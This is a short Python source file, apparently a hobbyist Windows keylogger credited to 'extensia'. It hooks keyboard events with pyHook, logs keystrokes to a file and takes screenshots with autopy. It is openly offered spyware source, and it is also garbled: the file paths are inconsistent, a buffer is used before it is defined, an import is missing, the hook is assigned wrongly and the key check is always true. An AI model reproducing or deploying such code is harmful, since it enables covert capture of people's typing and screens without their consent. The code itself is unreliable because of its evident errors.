import win32api
import win32console
import win32gui
import pythoncom, pyHook
import sys
import autopy
import time
import datetime

# too many developing lol
# developed and created by extensia

def onKeyboardEvent(event):
    if event.Ascii==5:
        sys.exit()
    if event.Ascii !=0 or 8:
        f=open('c:\log\output.txt','r+')
        f.close()
        f=open('c\log\output.txt','r+')
        bitmap = autopy.bitmap.capture_screen()
        bitmap.save('c\log\Keylog.txt')
        keylogs=chr(event.Ascii)
    if event.Ascii==13:
        keylogs='/n'
        buffer+=keylogs
        f.write(buffer)
        f.close()
        date_time = time.time()
        img = autopy.bitmap.capture_screen()
        SAVE_PATH = "c\log"
        LOGFILE_NAME = "%s.png" % date_time
        LOGFILE_PATH = os.path.join(SAVE_PATH,LOGFILE_NAME)
        img.save(LOGFILE_PATH)
        

hm=pyHook.HookManager()
hm=KeyDown=onKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()